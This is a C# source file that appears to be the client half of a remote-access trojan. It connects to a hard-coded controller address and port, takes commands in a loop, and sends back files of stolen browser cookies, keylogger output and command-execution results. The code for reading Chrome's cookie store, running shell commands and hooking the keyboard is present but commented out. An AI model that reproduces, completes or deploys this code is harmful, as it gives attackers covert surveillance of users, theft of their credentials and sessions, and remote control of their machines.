using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;

namespace Client
{
    internal class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
        static Thread th_doKeylogger;
        static Thread th_socket;
        static Thread th_cmd;

        static ASCIIEncoding encoding = new ASCIIEncoding();
       
        public static void sendFileSocket(TcpClient client, string type)
        {
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "cookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "keylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }
            byte[] dataTemp = File.ReadAllBytes(fileName);
            byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);

            int bufferSize = 1024;

            NetworkStream stream = client.GetStream();
            stream.Write(dataLength, 0, 4);

            int bytesSent = 0;
            int bytesLeft = dataTemp.Length;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);

                stream.Write(dataTemp, bytesSent, curDataSize);

                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }

        }
        public static void handleCommand(string command, TcpClient client, Stream stream)
        {
            byte[] data = new byte[BUFFER_SIZE];
            if (command.StartsWith("cookies"))
            {
                string url = command.Split('?')[1];
               // getCookies(driver, url);
                Console.WriteLine("gui cookies");
                sendFileSocket(client, "cookies");
                Console.WriteLine("gui xong cookies");


            }
            else if (command.StartsWith("keylogger"))
            {

                Console.WriteLine("gui keylogger");
                sendFileSocket(client, "keylogger");
                Console.WriteLine("gui xong keylogger");


            }
            else if (command.StartsWith("run cmd command"))
            {

                string cmd = command.Substring(15);
                Console.WriteLine("-------------------");
                Console.WriteLine(command);
                Console.WriteLine("-------------------");
                Console.WriteLine(cmd);
                Console.WriteLine("-------------------");
               // RunCommandAndGetOutput(cmd);
                Console.WriteLine("gui command");
                sendFileSocket(client, "cmd");
                Console.WriteLine("gui xong command");


            }
            else if (command.StartsWith("exit"))
            {

                string str = "done";

                data = encoding.GetBytes(str);
                stream.Write(data, 0, data.Length);
                Console.WriteLine("xong exit");
                client.Close();
            }
        }
        public static void handleConnectSocket()
        {

            //<--------------------- set up get cookies-------------------------->
            //ChromeOptions options = new ChromeOptions();
           // string username = RunCommandAndGetOutput("echo %username%").Trim();
            //string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
            //options.AddArguments(path, "headless");
            //IWebDriver driver = new ChromeDriver(options);
            //Console.WriteLine("set up xong cookies");
            //<---------------------end get cookies-------------------------->
            try
            {
                TcpClient client = new TcpClient();

                // 1. connect
                client.Connect("192.168.100.31", PORT_NUMBER);
                Stream stream = client.GetStream();
                Console.WriteLine("connect xong socket");

                byte[] data;


                while (true)
                {
                    data = new byte[BUFFER_SIZE];
                    stream.Read(data, 0, BUFFER_SIZE);
                    string command = encoding.GetString(data);
                    handleCommand(command, client, stream);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
            //driver.Quit();
        }
        static void Main(string[] args)
        {
                //th_doKeylogger = new Thread(new ThreadStart(HookKeyboard));
                //th_doKeylogger.SetApartmentState(ApartmentState.STA);
                //th_doKeylogger.Start();
                th_socket = new Thread(new ThreadStart(handleConnectSocket));
                th_socket.SetApartmentState(ApartmentState.STA);
                th_socket.Start();
        }
    }
}
